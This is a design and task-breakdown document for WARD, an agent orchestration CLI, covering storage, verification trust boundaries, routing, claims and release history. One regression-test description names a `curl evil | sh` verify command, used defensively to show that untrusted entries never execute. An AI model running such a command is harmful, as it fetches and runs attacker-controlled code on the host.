# WARD — v1 Task Breakdown

| | |
|---|---|
| Status | Draft (v1 planning) |
| Domain | tasks |
| Version | 0.1.0 |

## Scope (frozen v1)

The complete v1 build. Anything not listed here is **v2 or later** (see
`blueprint.md` non-goals: native LLM provider SDKs, vector search, multi-user
auth, MCP server, export/import, workspaces/git-worktree, TUI, TTL auto-
supersede, claim locking, auto-resolution of incomplete work).

This file sequences the build so that the three design decisions which block
schema/code are **forced to a default in Phase 0** before any dependent spec is
implemented, rather than discovered mid-build.

## Spec index

| Spec | Title | Phase introduced |
|---|---|---|
| `storage.md` | Unified SQLite schema | P1 |
| `memory.md` | Artifact lifecycle & retrieval | P2 |
| `orchestration.md` | DAG, approvals, resume | P3 |
| `verification.md` | Claims vs real repo state | P4 |
| `routing.md` | Classifier / model-tier router | P5 |
| `cli.md` | Cobra command tree | P7 (incremental from P1) |
| `flow.md` | End-to-end sequence | — (reference) |
| `blueprint.md` | Architecture blueprint | — (reference) |

## Phase 0 — decisions that block schema/code

Each record: **decided / why / forecloses / revisit-when**. "Leave open" is not
permitted here.

### D0.1 — Contention / touched-file detection mechanism

- **Decided:** adoption of **agent-declared `touched` sets** as the v1 source of
  truth for which files a node reads/writes. The executing agent/skill emits a
  `touched` list (files + read/write intent) in its output `work_item` payload;
  orchestration persists it onto the node's run row (see D0.2). The contention
  score (branching factor + overlap of `touched` sets across parallel/active
  nodes) is computed from these declared sets, never from the filesystem.
- **Why:** agrees with the explicit lean — the other two options are non-starters
  for v1. (a) *Static parsing of arbitrary skill scripts* is unbounded scope:
  scripts can shell out, `find`, `xargs`, build ephemeral files; no parser is
  honest. (b) *git-diff-based detection* only knows contention **after** the node
  already ran, which is too late to route the node's own tier or to raise
  ceremony *before* the contested write happens. Agent-declared `touched` is the
  only input available at routing time and is honest about what the agent intends
  to touch.
- **Forecloses:** automatic/script-based or git-based contention detection in v1.
- **Revisit-when:** if agents reliably fail to emit accurate `touched` sets (data
  shows chronic under-declaration causing unsafe `light` ceremony), add git-diff
  as a *post-hoc corroboration* of the declared set — but only to **flag**
  mismatch, never as the primary routing input (it remains too late to route the
  node itself). This is a P6/P7 hardening item, not a Phase 0 reopen.

### D0.2 — Contention persistence / `node_state`

- **Decided:** contention scoring inputs **are persisted**, via two concrete
  homes, and the "in-memory only / not a separate table" wording in
  `storage.md` is superseded:
  1. **Per-node execution state lives in a `run_nodes` table** (one row per DAG
     node per run) carrying `node`, `run_id`, `status`, `touched` (JSON), and
     `ceremony_level`. This aligns with `blueprint.md`'s `run_nodes` and replaces
     the whole-run `runs.current_node` + `pending_nodes`/`completed_nodes` JSON
     slices from `storage.md`'s sketch. Per-node rows are what make fan-out width
     and shared-state overlap *queryable* for the router (routing.md signal #3),
     which the JSON-slice design cannot do efficiently.
  2. **The router's decision inputs are persisted** in `routing_decisions`,
     extended with a `contention_inputs` JSON column (`branching_factor`,
     `shared_overlap`, `touched_files`). This keeps routing.md's audit/learning
     goal ("was this run's ceremony level justified in hindsight?") achievable
     without a third normalized `node_state` table.
- **Why:** routing.md's audit log is useless if the *inputs* to the decision
  evaporate; storage.md's in-memory-only approach makes hindsight analysis
  impossible. A per-node `run_nodes` row + a JSON inputs blob on the decision is
  the minimal persistence that satisfies both. No dedicated `node_state` table is
  introduced (storage.md's instinct stands — it's just materialized per node
  instead of computed-then-discarded).
- **Forecloses:** a separate normalized `node_state` table; whole-run blob
  execution state.
- **Revisit-when:** if a future learned router needs the *historical DAG topology*
  (not just the scored inputs) to retrain, promote `contention_inputs` into a
  normalized `node_graphs` table. Out of v1 scope.

### D0.3 — Verify sandboxing / trust boundary

- **Decided:** `verify_cmd` (and the structured `grep`/`build`/`test`/`hash`
  checks in verification.md) **executes only for artifacts authored in the
  current local session/repo** — i.e. artifacts whose provenance is local
  (`source_session`/`created_by` matches the local agent/session, or the artifact
  was created by `put`/`propose` in this store). Artifacts that are *imported*,
  *synced*, or otherwise lack local provenance are **never auto-executed**; they
  are stamped `verify_status = unknown` and must be explicitly trusted (a human
  runs `ward verify --trust <id>`, or the artifact is re-authored locally) before
  their check runs. In `full` ceremony mode (multi-agent), an artifact promoted by
  agent A is still "locally authored" relative to this store, so agent B's
  `resume` *may* execute it — the boundary is store-local, not per-agent.
- **Why:** verification.md correctly flags this as a code-execution trust
  boundary, not hardening. Once artifacts are shared across agents/sessions, an
  untrusted `verify_cmd` is arbitrary shell execution on every `resume`. The
  conservative, implementable default is "execute only what this store itself
  authored"; cross-store/imported artifacts are guilty-until-trusted.
- **Forecloses:** auto-executing imported/synced artifacts' verify commands in v1.
- **Revisit-when:** if a signing/allowlist mechanism lands (signed artifacts from
  trusted authors), the boundary can widen to "signed + allowlisted" without
  per-artifact human trust. Out of v1 scope.

### D0.4 — Vocabulary reconciliation (judgment call, flagged open to revision)

The settled `blueprint.md` uses different names than the `.spec/*.md` files
(`run_nodes` + `verifications` + `gap` tables; verbs `know`/`gap`/`task`/`doctor`).
To unblock schema work, v1 **forces these defaults** and treats them as open to
revision (not Phase-0-must-close, but flagged per the spec convention):

- **Execution state:** use `run_nodes` (per D0.2), not `storage.md`'s whole-run
  `runs` slice design. `storage.md` §"Proposed Schema Sketch" must be updated to
  drop the `runs.pending_nodes`/`completed_nodes` columns in favor of `run_nodes`.
- **Verification storage:** keep **artifact-column** `verify_cmd`/`verify_status`/
  `verify_at` (verification.md), **not** a separate `verifications` table. The
  blueprint's `verifications` table is an alternative; flagged open.
- **Incomplete-work storage:** keep the **structured `handoff --incomplete` field**
  (memory.md / flow.md step 8), **not** a separate `gap` table. The blueprint's
  `gap` table is an alternative; flagged open.
- **CLI verbs:** adopt `cli.md`'s tree (`memory` subtree + `ward route`/`verify`/
  `tick`/`run`/`resume`/`approve`/`reject`), **not** the blueprint's `know`/`gap`/
  `task`/`doctor` verbs, for v1. Flagged open to revision.

These are defaults so P1 can start; they do not change behavior, only naming.

## Build phases

Each phase is a crisp checkpoint. Exit criteria are commands/assertions that
prove done, in the spirit of chef's `tasks.md`.

### P1 — Storage foundation (`storage.md`, D0.2, D0.4)

- **Goal:** one `ward.db`, additive migrations, FTS5, id-hash dedup, and the
  tables the later phases depend on — `artifacts` (with `verify_*` + `ceremony_level`
  + `project` + `expires_at`), `run_nodes` (per D0.2), `channel_items`,
  `routing_decisions` (with `contention_inputs`), `workflows`/`agents`/`skills`.
- **Implements:** `storage.md` (whole file), `D0.2`, `D0.4`.
- **Exit criteria:**
  - `ward init` creates `.ward/ward.db` at `user_version = 1`; re-run is
    idempotent.
  - FTS5 index builds (or clean LIKE fallback if FTS5 absent) with insert/update/
    delete triggers.
  - Content-hash dedup verified: re-`put` of identical content returns the same id
    and does not reset `used_count`.
  - `run_nodes` / `channel_items` / `routing_decisions` tables exist with the
    D0.2 columns.
- **Depends on:** D0.2, D0.4.

### P2 — Memory core lifecycle (`memory.md`)

- **Goal:** chef-derived lifecycle + retrieval against `ward.db`; light/full
  ceremony recorded as a column + flag (auto-accept vs `propose`), but the
  *contention trigger* is not yet wired (defaults to `light` until P5).
- **Implements:** `memory.md` "What's kept from chef" (lifecycle, retrieval,
  project lens, `claim`, `handoff`/`resume` surface, `verify_*` columns, TTL
  *metadata*), reduced taxonomy (`fact|procedure|claim|note`), `incomplete`
  structured field.
- **Exit criteria:**
  - `propose`→`promote`→`supersede` works; `promote` idempotent on accepted,
    rejects superseded; `supersede --reason` recorded.
  - `search` (FTS5 + term-drop), `list`, `get` (bumps `used_count`, provenance),
    `context` (no full content), `stale` all function; accepted ranks above
    proposed (`~` flag).
  - `put` auto-accepts (`light` ceremony); `propose` stays `proposed`.
  - `handoff --incomplete '<json>'` stores `{summary,files,lines,why,attempted_at}`.
- **Depends on:** P1 (storage). D0.1 not yet consumed (ceremony trigger lands P5).

### P3 — Orchestration core (`orchestration.md`, D0.1)

- **Goal:** ciao DAG execution against `run_nodes`/SQLite, approval gates, channel
  I/O, crash-safe resume; **capture `touched` sets** (D0.1) into `run_nodes`.
- **Implements:** `orchestration.md` "What's kept from ciao" + "What's changed"
  (SQLite medium, router picks model, git-snapshot dropped), D0.1 capture.
- **Exit criteria:**
  - `ward run <wf>` loads/validates a DAG (Kahn: one start, acyclic), executes
    channel nodes end-to-end, halts at `approval`, prints `approval_id`.
  - `ward approve <id>` / `ward reject <id>` resume/reject; run reaches
    `completed`.
  - `ward resume <run_id>` recovers a run killed mid-advance (reload `run_nodes`,
    continue from last incomplete node).
  - Agent/skill output payload carries a `touched` list persisted to `run_nodes`.
  - **Observation only (not acted on in v1):** after each node, WARD logs the delta
    between the agent-declared `touched` set and the git-diff-observed changed-file
    set to `run_nodes`/the decision log, so D0.1's revisit condition ("chronic
    under-declaration causing unsafe `light` ceremony") can be judged on evidence
    rather than vibes.
  - Base execution treats `ceremony_level` as `light` (contention trigger wired P5).
- **Depends on:** P1 (storage, `run_nodes`), P2 (memory for result capture). D0.1
  (capture), D0.2 (`run_nodes`).

### P4 — Verification engine (`verification.md`, D0.3)

- **Goal:** make `verify` real — execute checks under the D0.3 trust boundary,
  stamp `verify_status`, queue verify-triggered supersede.
- **Implements:** `verification.md` §"What's changed" items 1–5 (routing
  precondition, structured check types, staleness, freshness TTL, scope boundary),
  D0.3.
- **Exit criteria:**
  - `ward verify` runs checks **only** for locally-authored artifacts; imported
    artifacts are stamped `unknown` and not executed.
  - A `verified`/`stale`/`error` artifact gets the correct `verify_status` +
    `verify_at`; `stale` `accepted` artifact is queued for
    `supersede --reason "stale per verify"`.
  - `verify_kind` discriminators (`shell`/`grep`/`build`/`test`/`hash`) execute as
    specified; freshness window demotes stale `verify_at` to `unknown`.
- **Depends on:** P1 (verify columns), P2 (artifacts + supersede). D0.3.

### P5 — Routing + ceremony scaling (`routing.md`, D0.1, D0.2)

- **Goal:** deterministic tiering consuming real signals; wire ceremony_level
  selection into orchestration; persist `routing_decisions` with `contention_inputs`;
  enforce retry budget.
- **Implements:** `routing.md` Signals 1–4, Tiering policy, Escalation rules,
  Output contract; D0.1 (consume `touched` overlap), D0.2 (persist inputs),
  routing.md "Retry budget" cap.
- **Exit criteria:**
  - `ward route <node>` prints `{tier, model, ceremony_level}` + the four signals
    used (memory hit, verify_status, contention, task type).
  - A `ward run` actually selects the model per node via the router (not hard-coded).
  - Under high contention (parallel `touched` overlap), `ceremony_level` flips to
    `full` and the router escalates the tier.
  - Cheap-failure escalation is capped (max 2 escalations/unit); `strong` failure
    terminates the unit (run `rejected` / route-to-human), no infinite loop.
  - `routing_decisions` rows record `contention_inputs` for hindsight audit.
- **Implemented (v1 slice):**
  - `internal/routing` is a pure function (no LLM call); `ward route` shows signals + tier.
  - **Verify is a live gate, not a stored column (thesis fix 2026-08-22):** the
    engine runs `verification.Run` against the repo *before* every `Route` call
    and persists the result; only `status=="verified"` counts as a memory hit.
    `ward router --seed` goes through this path (greps README.md for "OIDC");
    `ward router --seed-stale` greps a pattern that cannot match, so cheap does
    NOT fire. Covered by `engine_test.go` (passing vs failing live grep).
  - `ward run` selects per node via the router; nodes with a `run:` shell command
    are **executed** by the engine (real adapter). `ward router
    --workflow workflows/parallel-demo.yaml --auto-approve` shows two unordered
    siblings sharing a file → `build-b` escalates to `strong`/`full` (contention
    between *unordered* nodes only — the D0.1 false-positive trap).
  - **Failed `run:` is now first-class (thesis fix 2026-08-22):** the engine
    executes a node's `run:` command (real adapter). On failure it marks the
    node `failed` (NOT `done`), bumps the escalation count, and re-routes the
    SAME node at the higher tier the router selects — cheap → mid → strong →
    `REJECT`/human, capped at 2 escalations. Proven by `TestEngineRunFailureEscalates`.
    Each routing decision records `context` = the verified artifact ids only;
    failed-attempt prose is never carried into a retry (`resume from verified
    facts only`). Contention test fixed to not be order-lucky.

  - **Schema migrations idempotent (2026-08-22):** `escalation` (run_nodes),
    `context` (routing_decisions), and `workflow_path` (runs) are added via
    `ALTER` + `PRAGMA user_version = 2`, never a silent rewrite. A database
    from an earlier build opens and `INSERT`s cleanly (regression test
    `TestMigrationFromV1`). `workflow_path` lets `ward run resume`/`approve` in
    a second session reload the originating workflow without `--workflow`
    (previously defaulted to oidc-login and corrupted the run — fixed).
  - `maxEscalation` is now a single constant (`routing.MaxEscalation`).
  - Shipped `workflows/fail-demo.yaml` and `workflows/go-test-demo.yaml`;
    `ward router` now prints each decision's `context`.
  - `memory put` light ceremony auto-accepts; `memory get`/`supersede`, `verify
    --all`/`--trust`, structured `handoff --incomplete`, and `tick` (drift sweep)
    implemented. `go.mod` deps direct; `PRAGMA journal_mode=WAL` on open.
  - Table tests: `routing_test.go` (Route truth table), `workflow_test.go`
    (Validate: cycle / two roots / approval-without-channel), `verify_test.go`
    (local vs imported, hash drift), `engine_test.go` (live verify-on-read,
    contention on unordered siblings).
- **Depends on:** P2 (memory + verify_status real), P3 (`touched` sets + run_nodes),
  P4 (`verify_status` must be real before routing trusts it). D0.1, D0.2.

### P6 — Coordination: handoff/incomplete + claims (`memory.md`, `flow.md` step 8)

- **Goal:** structured incomplete surfaced on `resume`; `claim` reservations +
  conflict detection engaged under `full` ceremony.
- **Implements:** `memory.md` `claim` semantics (enforced at shared-state nodes under
  `full`), `resume` surfacing `verify_status` flags + `incomplete`; `flow.md` step 8.
- **Exit criteria:**
  - `ward resume` shows `incomplete` prominently (files/lines/why) and cached
    `verify_status` ✓/✗/⚠ on context artifacts.
  - A `claim add` on a topic already held is a hard error (non-zero exit):
    the unique index on `(claim_topic, project)` is the lock, so two processes
    can never both hold the same topic.
- **Depends on:** P2 (handoff/incomplete/claim), P4 (verify flags on resume), P5
  (ceremony_level → claim enforcement). D0.1 (shared-state nodes).

### P7 — CLI finalization + acceptance (`cli.md`)

- **Goal:** finalize the `cli.md` tree, global `--json`/`--digest`/error hygiene,
  and a session-A→B acceptance script locking the success criterion (flow.md:
  memory surfaces prior knowledge, verify re-anchors it, routing trusts only
  verified).
- **Implements:** `cli.md` (command tree, flag conventions), D0.4 verb set.
- **Exit criteria:**
  - Every command in `cli.md`'s tree exists; global `--json` parseable; one-line
    errors (`no artifact <id>`, `error: <detail>`).
  - A `ward-tasks-verify` script (chef `verification-001.sh` analogue) passes:
    session A stores knowledge → session B retrieves it without replay; a stale
    claim is caught by `verify` and **not** trusted by `route`; crash recovers via
    `resume`.
- **Depends on:** P1–P6. D0.4.

## Done definition

A phase is done when:
1. Its exit-criteria commands assert true / exit 0.
2. The spec it implements is phase-labeled and matches the build.
3. No earlier phase regresses (re-run P1–P4 checks after P5–P7).

## References

- `blueprint.md` — component map + v1 non-goals (TTL auto-supersede deferred).
- `flow.md` — end-to-end sequence; verify-gap closure at step 3; ceremony at step 6.
- `storage.md`, `memory.md`, `orchestration.md`, `routing.md`, `verification.md`,
  `cli.md` — the per-domain contracts implemented by P1–P7.
- chef `.specs/tasks.md` — granularity/format convention followed here.

---

## v0.1.0 — FROZEN (tagged 2026-08-22)

The three thesis invariants hold in the **engine**, not just the spec:

1. Memory cannot vote cheap unless the repo currently matches (live verify-on-read).
2. Failed `run:` is `failed`, never `done` (escalates cheap→mid→strong→human, cap 2).
3. Two escalations, then a human.

Additive SQLite migrations (`ALTER` + `user_version = 2`, skip-if-present);
`resume`/`approve` reload the originating workflow (no silent `oidc-login.yaml`
fallback); `workflows/fail-demo.yaml` and `workflows/go-test-demo.yaml` shipped.

**Do not start B. Do not extend the engine until v0.2 evidence exists.**

## v0.2 backlog (tracked, not for v0.1)

### B — Result capture (the real v0.2, not an engine bug)

`go-test-demo.yaml` runs `go test` then `grep` as **work**; it does not
`UpsertArtifact` on success. Cheap on `verify` only happens if something was
already `put`/`Seed`ed and tagged `verify` (done by hand during "use it").
The flow.md step-7 write-back loop is still manual. "Never re-solve" is a read
path with a human on the write path — acceptable for v0.1.

```
on run: success
  → put accepted artifact
  → attach verify_cmd (grep/hash/test)
  → next session live-verifies it
  → only then may it vote cheap
```

Trigger: use WARD on a repo that is not WARD; if result-capture is painful,
that is the evidence to start B. Do NOT start B speculatively.

#### Evidence — 2026-08-22, secure-bank (foreign repo)

WARD ran end-to-end against `secure-bank` with real work as substrate. All
thesis invariants held on foreign state:

- **cheap+verified:** implement/test routed cheap after live grep + `go test ./...`.
- **drift caught:** a "GraphQL gateway" spec failed live grep → mid tier, never
  voted cheap.
- **trust boundary:** an imported artifact stayed `unknown`, never executed.
- **contention:** unordered siblings sharing `main.go` → `strong` + `full`.
- **fail→escalate:** a `gofmt` gate failed (pre-existing misalignment) →
  cheap→mid→strong → run **rejected**, no silent success.
- **two sessions:** `start` paused at approval; a *fresh process* resumed via the
  persisted workflow path.

**The friction is measured, not vibes.** 5 memory artifacts = 5 hand-typed
invocations, each carrying summary+content+tags+verify-cmd; and `tags` must
match node ids *exactly* or routing silently misses (the author only knew this
from reading `engine.go:201`). Verification itself worked flawlessly on foreign
state — it caught a stale spec and a dirty file. So the skeleton holds; what
hurts is **authoring claims**, not trusting them.

**Conclusion:** B is now *evidenced*, not speculative. Approve to start when you
say the word. Do not start speculatively.

#### Implemented (2026-08-22) — v0.2 thin slice, CLI-only, no engine changes

B closed flow.md step 7. Changes (all in `internal/cli`, engine untouched):

- `ward capture` command + `autoCapture` after `run start`/`resume`/`approve`:
  every done node with a `run:` writes a store-local **accepted** (light)
  artifact. `ward capture --run <id>` also captures nodes without a `run:`.
- **Default tag = node id** (the only tag routing needs for a hit) → the silent
  miss from hand-typed tags is gone at the source.
- **verify_cmd inferred:** `kind: test` → `go test ./...`; a node declaring a
  concrete `produces` file → `sha256::<path>` (glob produces skipped). Override
  with `--verify-cmd`/`--verify-kind`. Verification is **deferred** to the next
  session (no immediate re-execution of `go test`).
- `ward router` now logs `miss: no verified artifact tagged <node>` instead of
  silence.

Acceptance met on this repo: first run auto-captured `test`/`verify`; second run
routes them `tier=cheap` (`hit=true verify=verified`) via live re-verify; other
nodes miss (logged). Unit-tested in `internal/cli/capture_test.go`.

All four leftovers CLOSED (2026-08-22):

### Leftovers (CLOSED)

- **`TestMigrationFromV1` tests the wrong era — CLOSED.** Rewritten to build a
  true *aadb0dc*-era DB (the three migrated tables WITHOUT escalation/context/
  workflow_path) via a raw connection, then reopen with the current binary so
  `addColumn` ALTERs them in idempotently. Covers the real missing-columns case.
- **Resume overwrite regression test — CLOSED.** `TestResolveRunWFUsesPersistedPath`
  asserts a second session reloads the run's persisted `workflow_path` (not the
  oidc-login default) via `resolveRunWF`.
- **`produces: ["*.go"]` literal, not glob — CLOSED.** `inferVerify` now expands
  glob produces via `filepath.Glob` to a concrete file before hashing
  (`TestCaptureNodeGlobProduces`).
- **`go-test-demo` `verify` node was a `run: grep` mislabeled — CLOSED by the v0.3
  inference fix** (below): a node now captures its own `run:` as the verify_cmd,
  so the grep verify node records "grep passes", not "go test passes".

### Inference nit (CLOSED 2026-08-22)

`inferVerify` mapped `kind: test -> go test ./...` — too coarse: `go-test-demo`'s
`verify` node is `kind: test` with `run: grep -rq WARD README.md`, so capture
recorded a claim that **`go test` passes**, not that WARD is in the README.

**Fix:** `inferVerify` now defaults `verify_cmd` to the node's own `run:` (shell);
only falls back to `go test ./...` when `run:` is empty AND the node is a test.
Hash-of-`produces` (with glob expansion) stays the non-test path. Covered by
`TestCaptureNodeInfersRunNotGoTest` and `TestCaptureNodeGlobProduces`.

None of these reopen the thesis.

### Model adapter (implemented 2026-08-22, post-v0.2.0)

The routing/verification engine was decision-only — `route`/`router` printed the
tier and never drove work. Added `internal/adapter` (separate from the engine):
`adapter.Run(repo, model, prompt)` shells out to `opencode run -m <free-model>
--dir <repo> <prompt>`. `stepNode` invokes it for any node carrying a `prompt:`
field, at the tier the router selected (`adapter.ModelForTier`); a model failure
follows the same escalate→reject path as a failed `run:`. `run:` shell nodes are
unchanged, so all existing demos still work. `Node.Prompt` added (yaml `prompt`);
`workflows/agent-demo.yaml` demonstrates a prompt node + `go test` verify node.

Live smoke test: `opencode run -m opencode/hy3-free --dir /tmp '...'` returned
its answer — the adapter drives a free model end-to-end. The engine's
routing/verify logic was not touched.

#### Review findings

- **D0.3 trust boundary — CLOSED (2026-08-22).** `memory put` now defaults to
  `Local: false` (guilty by default). An artifact's `verify_cmd` is only executed
  for store-local artifacts (`verification.Run` already gates on `a.Local`), so an
  agent cannot gain silent code execution by writing a malicious memory entry.
  Crossing the boundary is now an explicit opt-in: `ward memory put --local` or
  `--by human`. `capture` (WARD's own work after a successful run) and `router
  --seed` remain store-local because they are this store's own work product, not
  agent injection. Regression-tested: `TestMemoryPutDefaultNotLocal` asserts a
  put with a `curl evil | sh` verify_cmd is not local and never runs;
  `TestMemoryPutLocalTrust` asserts `--local`/`--by human` do mark local.
  Committed after the model-adapter work (post-v0.2.0, untagged).
- **`claim` command — CLOSED (2026-08-22), RECAST as exclusive (lock) in v0.4.x.**
  `ward memory claim add <topic> [--by a] [--ttl m]` is an EXCLUSIVE reservation:
  the unique index on `(claim_topic, project)` enforces one active claim per
  (topic, project); a conflicting `claim add` is a hard error (`error: claim
  overlap on <topic>`, non-zero exit), never a warning. `claim release <topic>` /
  `claim list` manage active claims. Claims are stored as `kind:claim` artifacts
  with a TTL; `ward tick` frees expired claims (clears `claim_topic`) so the topic
  can be re-claimed. Covered by `TestClaimLifecycle` + `TestSweepExpiredClaims`.
- **`context` builder — CLOSED (2026-08-22).** `ward memory context <query>`
  prints a compact injection block (ids, kind, summary, tags, verify_status, no
  full content). Covered by `TestContextCompactBlock`.
- **`stale` CLI — CLOSED (2026-08-22).** `ward memory stale [--days N] [--mark
  <id>]` surfaces stale/error/unknown artifacts (and rarely-used ones with
  `--days`); `--mark` sets one stale by hand.
- **`router`/`route` hardcoded default path — CLOSED (2026-08-22).** `ward
  router` now resolves its workflow via `resolveRouterWF`: explicit `--workflow`
  wins; else the seed demo workflow when seeding; else the most recent run's
  persisted `workflow_path` (new `Store.LatestRun`); else the canonical demo
  workflow as last resort. It no longer blindly forces oidc-login. `route` never
  loaded a file at all, so unaffected.

These remaining items do not reopen the thesis; the adapter was the "useful tool"
blocker and the D0.3 trust gap was the blocker for multi-agent use. With all of
them closed, there are no known open items in the v0.1–v0.2 line or the review.



## Release history

- **v0.1.0** (8dc6fa8) — thesis freeze: verify-gated routing, live verify-on-read,
  escalation-on-failure, Context column, idempotent migrations.
- **v0.2.0** (1a612ef) — result capture (thin B): auto-write accepted artifacts
  on run/resume so the next session routes cheap without hand-typed YAML.
- **v0.3.0** (d2dd871) — usable-tool freeze: model adapter wired (drives real
  opencode free models at the routed tier; failures escalate like shell
  failures), D0.3 trust boundary closed (put defaults non-local; --local/--by
  human required), chef ergonomics (claim/context/stale), v0.3 inference nit
  fixed, migration test strengthened to a true pre-columns DB. No known open
  items remain.

## v0.4 — parallel-dispatch foundations (in progress, untagged)

Scope deliberately limited to the **two primitives** parallel agent dispatch
needs; the broker service / pickup loop is NOT built this pass (see `broker.md`
non-goals). Spec-first: `.spec/broker.md` written before any code.

### Foundations delivered

- **Claim atomicity — the database is the arbiter (`broker.md` §1).** `claim add`
  was check-then-insert (`activeClaims` SELECT then a separate INSERT);
  `SetMaxOpenConns(1)` only serialized *within* one process, so two `ward`
  binaries sharing `ward.db` could both win. Now: a `claim_topic` column +
  unique index `uni_claim_topic ON artifacts(claim_topic, project)`. A claim is a
  single plain `INSERT` (`Store.ClaimTopic`) — on conflict the caller errors
  (`error: claim overlap on <topic>`, non-zero exit); `ReleaseClaim` and `tick`
  both set `claim_topic=NULL` to free the slot. `PRAGMA busy_timeout=5000` added
  so concurrent writers (cross-process) wait instead of getting `SQLITE_BUSY`.
  Migration is additive (`user_version` 2→3). `--strict` removed: a conflict is
  always exclusive. Tests: `TestClaimTopicAtomicRace` (8 processes, exactly one
  wins), `TestClaimReleaseAndReclaim`, `TestClaimLifecycle` (rewritten: different
  topics → 2 active; same topic → hard error), `TestSweepExpiredClaims`.
- **`tier:` field is a routing FLOOR (`broker.md` §2).** `Node.Tier`
  (`yaml:"tier"`); `routing.Inputs.DeclaredTier` is applied **last** in `Route`,
  so it can never lower the selected tier — even a memory-hit+verified-cheap case
  cannot drop below a declared `strong`. Absent `tier` = unchanged v0.3.0
  inference (regression-guarded by existing `TestRoute` cases). `stepNode` passes
  `node.Tier` into the Inputs. Tests: `TestRouteDeclaredTierFloor` (floor holds,
  forces `full`; cheap floor on a miss stays `mid`; no-tier + invalid-tier
  unchanged), `TestEngineNodeTierFloor` (end-to-end decision recorded at the
  declared tier).
- **`ward init --scaffold` (`broker.md`, `cli.md`).** creates `.spec/blueprint.md`
  and `.arch/tasks.md` in the **current** directory (any project), each with the
  Status|Domain|Version header table, idempotent (skips existing files). Test:
  `TestScaffoldSpecs`.

### Designed but NOT implemented this pass (explicit non-goals)

- **Cross-process escalation handoff (`broker.md` §3).** On failure, the claim
  releases and `run_nodes.escalation` (already incremented by `failNode`) is the
  persisted required-tier signal; the node re-enters the pickup pool for ANY
  eligible agent. The picking mechanism (broker/poll loop + agent budget
  registration) is deferred to v0.5+.
- **Pickup/poll loop & agent budget registration** — the next slice, built
  directly on these two primitives.

### Open questions carried

- **Legacy (pre-v0.4) claims — RESOLVED to visible, not silent.** They have
  `claim_topic=NULL` so the unique index does not enforce them and
  `activeClaims` does not list them: a pre-v0.4 claim is silently
  non-enforceable and will not block a later `claim add` on the same topic.
  This is a **one-time transition gap**, not recurrent. Made visible via
  `ward doctor` (`legacy_claims` count of accepted `kind=claim` rows with
  `claim_topic IS NULL`); `Store.LegacyClaimCount` + `TestLegacyClaimCount`.
  Backfilling old claims left undone (operator can see/clear them).
- **Expired-but-unreleased claim blocking re-claim — RESOLVED (v0.4.x).** `Store.SweepExpiredClaims` (run by `ward tick`) now nulls `claim_topic` on
  claims whose `expires_at` has passed, so they no longer occupy their slot.
  `TestSweepExpiredClaims` + `TestClaimExpiredThenTickFrees` prove re-claim works.
- Topic granularity for work items (`<runID>:<nodeID>` proposed) left to the
  broker design.

## v0.5 — self-consulting tool + dispatch loop (2026-08-22, commits e517656 + 181b4c6)

Two slices: (a) auto-consultation — the project carries its own protocol; (b)
the wish-list triage — 7 of 13 wishes implemented, rest tossed with rationale.

### Slice A: auto-consultation

- **Agent-doc injection (`internal/cli/agentdoc.go`).** `ward init` injects a
  marker-delimited protocol block into `AGENTS.md` by default (creates if
  missing) and refreshes existing `CLAUDE.md`/`GEMINI.md` (never invents).
  Idempotent: unchanged → no-op; corrupted managed region → refreshed in place;
  half-present markers → refused (no guessing). `--no-agents-md` opts out.
  Content outside markers is never touched. Tests:
  `TestUpsertAgentBlock*`, `TestEnsureAgentDocsOnlyUpdatesExistingExtras`.
- **`ward brief [topic]`.** Session bootstrap: live tick sweep (drift caught
  before it routes wrong), expired-claim sweep, compact knowledge pointers,
  open runs, active claims, health counts, imperative next actions.
  `--json` structured. Tests: `TestBriefSurfacesKnowledgeRunsAndClaims`,
  `TestBriefNextActionsGuidance`.
- Plumbing: `ward version`; cobra completions confirmed; `claim add --json`
  fixed (was human-only); `run start` resolves
  `--workflow > workflows/default.yaml > demo` instead of hardcoding oidc-login.

### Slice B: wish-list triage (implemented)

- **Dispatch pool (wishes 01+02, broker.md §4).** `tasks` table (schema v4);
  `ward task add|next|list|done|fail|workflow`. Atomic pull via conditional
  UPDATE on `status='open'`; `--max-tier` is a hard budget ceiling (admission);
  failure bumps floor one tier back into the pool; past strong → rejected for a
  human. `task workflow` generates a runnable single-node DAG
  (orchestration.md TaskWorkflow). Tests: `TestTaskLifecycle`,
  `TestClaimNextTaskAdmissionByBudget`, `TestFailTaskBumpsFloorThenRejects`,
  `TestTaskBrokerFlow`.
- **Self-healing ticks (wish 04, verification.md item 7).** `tick --heal`
  supersedes local accepted artifacts failing live re-verification
  (reason `drift`), inspecting post-sweep statuses so zombies from prior ticks
  are healed too. Test: `TestTickHealSupersedesDriftedArtifacts`.
- **Routing explainer (wish 05).** `ward explain <run> [node]`: decisions +
  live re-read context status + per-attempt event transcript. Observer only;
  router purity untouched.
- **Reject dossier (wish 10, orchestration.md).** Engine writes an evidence
  packet on escalation exhaustion (tier path, attempts, available verified
  context), tagged `dossier` + `reject:<runID>` — deliberately NOT the bare
  node id, which would count as a future memory hit (thesis violation caught in
  review). `ward reject <run>` reads it. Test: `TestRejectDossierAndExplain`;
  regression surfaced by `TestEngineRunFailureEscalates`.
- **Golden verify kind (wish 11 partial).** `<expected-file>::<command>`:
  output diff vs checked-in expectation, trailing newlines normalized. Test:
  `TestRunGolden`.

### Tossed (with rationale, recorded here so they aren't re-proposed)

- Worktree isolation per claim (03): claim lock + unordered-sibling contention
  detection suffice; FS mutation risk outweighs value today.
- Cost accounting (06): free models, invented numbers — an observer without a
  signal.
- Project cost-policy ceilings (07): conflicts with escalation semantics (a
  capped tier must reject on overflow); premature config surface.
- Knowledge federation across stores (09): real but not now; import-as-untrusted
  already exists via `put --imported`.
- Watch daemon (12): a cron wrapper does 90%; daemon lifecycle (pid files,
  single-instance) isn't worth it yet.
- MCP substrate (13): strategically right, deferred to its own session with the
  official Go SDK; CLI + `--json` serves agent integration today.
- `judge` verify kind ≈ shell; `benchmark` needs numeric baselines (premature).

### Specs updated in this pass

storage.md (migration log v2–v4), broker.md (§3 realized, §4 added, open
questions resolved), verification.md (golden kind, heal semantics, auto-supersede
question resolved), memory.md (brief section, drift vocabulary),
orchestration.md (TaskWorkflow, dossier, LoadEvents), routing.md (observers,
retry budget resolved), cli.md (shipped command tree).

### Open items carried

- Agent registry persistence vs pull-time `--max-tier` (broker.md).
- MCP substrate as the next major slice when multi-tool integration is needed.
- Verify TTL window ("fresh enough") still unspeced — brief/tick re-verify on
  every session start, which currently makes TTL moot in practice.

## v0.5.x — dogfood readiness for the small-agent simulation (2026-08-22)

Goal: a smaller model agent must be able to run the ENTIRE protocol with no
human correction. Three gaps were closed before the simulation starts.

